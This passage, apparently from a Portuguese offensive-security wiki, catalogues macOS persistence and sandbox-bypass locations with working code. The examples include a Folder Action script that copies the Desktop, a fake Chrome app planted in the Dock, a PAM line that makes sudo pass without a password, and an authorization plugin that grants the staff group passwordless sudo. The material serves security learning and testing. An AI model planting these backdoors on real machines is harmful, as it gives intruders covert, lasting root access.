- `019bdcd2` - tempo em hex. Representa os minutos passados desde epoch. `0x019bdcd2` é `26991826` em decimal. Se multiplicarmos por 60 obtemos `1619509560`, que corresponde a `GMT: 2021. 27 de abril, terça-feira 07:46:00`.

Se imprimirmos o ficheiro do job, verificamos que ele contém as mesmas informações obtidas usando `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas é necessário conseguir chamar `osascript` com argumentos para contactar **`System Events`** para poder configurar Folder Actions
- Bypass de TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Possui algumas permissões básicas do TCC como Desktop, Documents e Downloads

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Requer root
- **Trigger**: Acesso à pasta especificada
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Acesso à pasta especificada

#### Descrição & Exploração

Folder Actions são scripts automaticamente disparados por alterações numa pasta, como adicionar ou remover itens, ou outras ações como abrir ou redimensionar a janela da pasta. Essas ações podem ser usadas para várias tarefas e podem ser acionadas de diferentes maneiras, como usando a Finder UI ou comandos no terminal.

Para configurar Folder Actions, existem opções como:

1. Criar um workflow de Folder Action com [Automator](https://support.apple.com/guide/automator/welcome/mac) e instalá-lo como um serviço.
2. Anexar um script manualmente via o Folder Actions Setup no menu de contexto de uma pasta.
3. Utilizar OSAScript para enviar mensagens Apple Event para o `System Events.app` para configurar programaticamente um Folder Action.
- Este método é particularmente útil para incorporar a ação no sistema, oferecendo um nível de persistência.

O script a seguir é um exemplo do que pode ser executado por um Folder Action:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Para tornar o script acima utilizável pelo Folder Actions, compile-o usando:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Depois que o script for compilado, configure Folder Actions executando o script abaixo. Esse script habilitará Folder Actions globalmente e anexará especificamente o script compilado anteriormente à pasta Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Execute o script de configuração com:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Esta é a forma de implementar esta persistência via GUI:

Este é o script que será executado:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Compile com: `osacompile -l JavaScript -o folder.scpt source.js`

Mova para:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Então, abra o app `Folder Actions Setup`, selecione a **pasta que você deseja monitorar** e, no seu caso, selecione **`folder.scpt`** (no meu caso eu a chamei de output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Agora, se você abrir essa pasta com o **Finder**, seu script será executado.

Essa configuração foi armazenada no **plist** localizado em **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** em formato base64.

Agora, vamos tentar preparar essa persistência sem acesso à GUI:

1. **Copie `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** para `/tmp` para fazer um backup:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Remova** as Folder Actions que você acabou de definir:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Agora que temos um ambiente vazio

3. Copie o arquivo de backup: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Abra o Folder Actions Setup.app para aplicar essa configuração: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> E isso não funcionou para mim, mas essas são as instruções do writeup:(

### Atalhos do Dock

Artigo: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas você precisa ter instalado um aplicativo malicioso no sistema
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- `~/Library/Preferences/com.apple.dock.plist`
- **Gatilho**: Quando o usuário clica no app dentro do Dock

#### Descrição e Exploração

Todos os aplicativos que aparecem no Dock são especificados dentro do plist: **`~/Library/Preferences/com.apple.dock.plist`**

É possível **adicionar uma aplicação** apenas com:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Com um pouco de **social engineering** você poderia **imitar, por exemplo, o Google Chrome** no dock e realmente executar seu próprio script:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Útil para bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Uma ação muito específica precisa acontecer
- Você terminará em outro sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/Library/ColorPickers`
- Requer Root
- Trigger: Use the color picker
- `~/Library/ColorPickers`
- Trigger: Use the color picker

#### Description & Exploit

**Compile a color picker** bundle com seu código (você poderia usar [**this one for example**](https://github.com/viktorstrate/color-picker-plus)) e adicione um constructor (like in the [Screen Saver section](macos-auto-start-locations.md#screen-saver)) e copie o bundle para `~/Library/ColorPickers`.

Então, quando o color picker for acionado, você também deverá estar.

Observe que o binário que carrega sua biblioteca possui uma **sandbox muito restritiva**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Útil para bypass sandbox: **Não, porque você precisa executar seu próprio app**
- TCC bypass: ???

#### Localização

- Um app específico

#### Descrição & Exploit

Um exemplo de aplicação com uma Finder Sync Extension [**pode ser encontrado aqui**](https://github.com/D00MFist/InSync).

As aplicações podem ter `Finder Sync Extensions`. Essa extensão ficará dentro de um aplicativo que será executado. Além disso, para que a extensão consiga executar seu código ela **deve ser assinada** com algum certificado válido de desenvolvedor Apple, deve ser **sandboxed** (embora exceções relaxadas possam ser adicionadas) e deve ser registrada com algo como:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Útil para contornar o sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas você acabará em um sandbox comum de aplicação
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- `/System/Library/Screen Savers`
- Requer root
- **Gatilho**: Selecione o Screen Saver
- `/Library/Screen Savers`
- Requer root
- **Gatilho**: Selecione o Screen Saver
- `~/Library/Screen Savers`
- **Gatilho**: Selecione o Screen Saver

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Descrição & Exploit

Crie um novo projeto no Xcode e selecione o template para gerar um novo **Screen Saver**. Em seguida, adicione seu código a ele; por exemplo, o código a seguir para gerar logs.

**Build** o projeto e copie o bundle `.saver` para **`~/Library/Screen Savers`**. Em seguida, abra a GUI do Screen Saver e, ao clicar nele, ele deve gerar muitos logs:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Observe que, como nos entitlements do binary que carrega este código (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) é possível encontrar **`com.apple.security.app-sandbox`**, você estará **dentro do common application sandbox**.

Código do Saver:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Plugins do Spotlight

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Útil para bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas você acabará em um application sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- A sandbox parece muito limitada

#### Localização

- `~/Library/Spotlight/`
- **Trigger**: Um novo arquivo com uma extensão gerenciada pelo plugin do Spotlight é criado.
- `/Library/Spotlight/`
- **Trigger**: Um novo arquivo com uma extensão gerenciada pelo plugin do Spotlight é criado.
- Requer root
- `/System/Library/Spotlight/`
- **Trigger**: Um novo arquivo com uma extensão gerenciada pelo plugin do Spotlight é criado.
- Requer root
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Um novo arquivo com uma extensão gerenciada pelo plugin do Spotlight é criado.
- Requer novo app

#### Descrição e Exploração

Spotlight é o recurso de busca integrado do macOS, projetado para fornecer aos usuários **acesso rápido e abrangente aos dados em seus computadores**.\
Para viabilizar essa capacidade de busca rápida, o Spotlight mantém um **banco de dados proprietário** e cria um índice ao **parsear a maioria dos arquivos**, permitindo buscas rápidas tanto por nomes de arquivos quanto pelo conteúdo.

O mecanismo subjacente do Spotlight envolve um processo central chamado 'mds', que significa **'metadata server'.** Esse processo orquestra todo o serviço Spotlight. Complementando isso, existem múltiplos daemons 'mdworker' que realizam uma variedade de tarefas de manutenção, como indexar diferentes tipos de arquivos (`ps -ef | grep mdworker`). Essas tarefas são possibilitadas por meio de importer plugins do Spotlight, ou **".mdimporter bundles**", que permitem ao Spotlight entender e indexar conteúdo em uma ampla gama de formatos de arquivo.

Os plugins ou **`.mdimporter`** bundles estão localizados nos locais mencionados anteriormente e, se um novo bundle aparecer, ele é carregado em minutos (não é necessário reiniciar qualquer serviço). Esses bundles precisam indicar quais **file type and extensions they can manage**, dessa forma, o Spotlight os utilizará quando um novo arquivo com a extensão indicada for criado.

É possível **encontrar todos os `mdimporters`** carregados executando:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
E, por exemplo, **/Library/Spotlight/iBooksAuthor.mdimporter** é usado para analisar esse tipo de arquivo (extensões `.iba` e `.book`, entre outras):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Se você verificar o Plist de outros `mdimporter` pode não encontrar a entrada **`UTTypeConformsTo`**. Isso porque é um _Identificadores de Tipo Uniforme_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) incorporado e não precisa especificar extensões.
>
> Além disso, os plugins padrão do Sistema sempre têm precedência, então um atacante só pode acessar arquivos que não sejam indexados pelos próprios `mdimporters` da Apple.

To create your own importer you could start with this project: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) and then change the name, the **`CFBundleDocumentTypes`** and add **`UTImportedTypeDeclarations`** so it supports the extension you would like to support and refelc them in **`schema.xml`**.\
Then **change** the code of the function **`GetMetadataForFile`** to execute your payload when a file with the processed extension is created.

Finalmente **compile e copie seu novo `.mdimporter`** para um dos locais anteriores e você pode verificar quando ele é carregado **monitorando os logs** ou checando **`mdimport -L.`**

### ~~Preference Pane~~

> [!CAUTION]
> Parece que isso não funciona mais.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Requer uma ação específica do usuário
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

Parece que isso não funciona mais.

## Root Sandbox Bypass

> [!TIP]
> Aqui você pode encontrar start locations úteis para **sandbox bypass** que permitem simplesmente executar algo ao **escrevê-lo em um arquivo** como **root** e/ou exigindo outras **condições estranhas.**

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas é necessário ser root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Requer root
- **Gatilho**: Quando chegar a hora
- `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local`
- Requer root
- **Gatilho**: Quando chegar a hora

#### Description & Exploitation

The periodic scripts (**`/etc/periodic`**) are executed because of the **launch daemons** configured in `/System/Library/LaunchDaemons/com.apple.periodic*`. Observe que scripts armazenados em `/etc/periodic/` são **executados** como o **proprietário do arquivo**, então isso não funcionará para uma possível elevação de privilégios.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Existem outros scripts periódicos que serão executados, indicados em **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Se você conseguir escrever em qualquer um dos arquivos `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local` ele será **executado mais cedo ou mais tarde**.

> [!WARNING]
> Note that the periodic script will be **executed as the owner of the script**. So if a regular user owns the script, it will be executed as that user (this might prevent privilege escalation attacks).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Útil para contornar o sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas você precisa ser root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- Root sempre necessário

#### Descrição & Exploração

Como o PAM é mais focado em **persistence** e malware do que em execução fácil dentro do macOS, este blog não dará uma explicação detalhada, **leia os writeups para entender melhor esta técnica**.

Verifique os módulos do PAM com:
```bash
ls -l /etc/pam.d
```
Uma técnica de persistência/elevação de privilégios abusando do PAM é tão simples quanto modificar o módulo /etc/pam.d/sudo, adicionando no início a linha:
```bash
auth       sufficient     pam_permit.so
```
Então ficará **assim**:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
E, portanto, qualquer tentativa de usar **`sudo` funcionará**.

> [!CAUTION]
> Observe que este diretório é protegido pelo TCC, então é muito provável que o usuário receba um prompt solicitando acesso.

Outro bom exemplo é su, onde você pode ver que também é possível passar parâmetros para os módulos PAM (e você também poderia backdoor este arquivo):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Plugins de Autorização

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Útil para contornar sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas é necessário ser root e fazer configurações extras
- TCC bypass: ???

#### Localização

- `/Library/Security/SecurityAgentPlugins/`
- Requer root
- Também é necessário configurar o authorization database para usar o plugin

#### Descrição & Exploração

Você pode criar um plugin de autorização que será executado quando um usuário fizer login para manter persistência. Para mais informações sobre como criar um desses plugins, confira os writeups anteriores (e tenha cuidado: um plugin mal escrito pode travar seu acesso e você terá que limpar seu Mac a partir do recovery mode).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Mova** o bundle para o local a ser carregado:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Finalmente adicione a **regra** para carregar este Plugin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
The **`evaluate-mechanisms`** informará ao framework de autorização que será necessário **chamar um mecanismo externo para autorização**. Além disso, **`privileged`** fará com que seja executado como root.

Acione-o com:
```bash
security authorize com.asdf.asdf
```
E então o **grupo staff deve ter acesso sudo** (leia `/etc/sudoers` para confirmar).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Útil para contornar sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas você precisa ser root e o usuário deve usar man
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- **`/private/etc/man.conf`**
- Requer root
- **`/private/etc/man.conf`**: Sempre que man for usado

#### Descrição & Exploit

O arquivo de configuração **`/private/etc/man.conf`** indica o binário/script a ser usado ao abrir arquivos de documentação do man. Então o caminho para o executável pode ser modificado de modo que toda vez que o usuário usar man para ler alguma documentação, uma backdoor seja executada.

Por exemplo, defina em **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Em seguida, crie `/tmp/view` como:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Útil para contornar sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas é necessário ser root e o apache precisa estar em execução
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd não possui entitlements

#### Localização

- **`/etc/apache2/httpd.conf`**
- Requer root
- Gatilho: Quando Apache2 é iniciado

#### Descrição & Exploit

Você pode indicar em `/etc/apache2/httpd.conf` para carregar um módulo adicionando uma linha como:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Dessa forma, seu módulo compilado será carregado pelo Apache. A única coisa é que você precisa, ou **assiná-lo com um certificado Apple válido**, ou **adicionar um novo certificado confiável** no sistema e **assiná-lo** com ele.

Então, se necessário, para garantir que o servidor será iniciado você pode executar:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Exemplo de código para o Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Útil para contornar sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas você precisa ser root, auditd estar em execução e causar um aviso
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- **`/etc/security/audit_warn`**
- Requer root
- **Gatilho**: Quando auditd detecta um aviso

#### Descrição & Exploit

Sempre que auditd detecta um aviso o script **`/etc/security/audit_warn`** é **executado**. Então você pode adicionar seu payload nele.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Você pode forçar um aviso com `sudo audit -n`.

### Itens de Inicialização

> [!CAUTION] > **Isso está obsoleto, então nada deve ser encontrado nesses diretórios.**

O **StartupItem** é um diretório que deve ser posicionado em `/Library/StartupItems/` ou `/System/Library/StartupItems/`. Uma vez que esse diretório é criado, ele deve conter dois arquivos específicos:

1. Um **rc script**: um shell script executado na inicialização.
2. Um **plist file**, chamado especificamente `StartupParameters.plist`, que contém várias configurações.

Certifique-se de que tanto o rc script quanto o arquivo `StartupParameters.plist` estejam corretamente posicionados dentro do diretório **StartupItem** para que o processo de inicialização os reconheça e utilize.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Não consigo encontrar esse componente no meu macOS, então para mais informações consulte o writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Introduzido pela Apple, **emond** é um mecanismo de logging que parece estar subdesenvolvido ou possivelmente abandonado, mas permanece acessível. Embora não seja particularmente útil para um administrador de Mac, esse serviço obscuro pode servir como um método sutil de persistência para atores de ameaça, provavelmente despercebido pela maioria dos administradores macOS.

Para quem conhece sua existência, identificar qualquer uso malicioso do **emond** é simples. O LaunchDaemon do sistema para esse serviço procura scripts para executar em um único diretório. Para inspecionar isso, o seguinte comando pode ser usado:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Localização

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root necessário
- **Trigger**: With XQuartz

#### Description & Exploit

XQuartz is **no longer installed in macOS**, so if you want more info check the writeup.

### ~~kext~~

> [!CAUTION]
> É tão complicado instalar kext mesmo como root que não considerarei isto para escape from sandboxes ou mesmo para persistence (a menos que você tenha um exploit)

#### Localização

Para instalar um KEXT como item de startup, ele precisa ser **instalado em um dos seguintes locais**:

- `/System/Library/Extensions`
- Arquivos KEXT incorporados ao sistema operacional OS X.
- `/Library/Extensions`
- Arquivos KEXT instalados por software de terceiros

Você pode listar os arquivos kext carregados atualmente com:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
For more information about [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

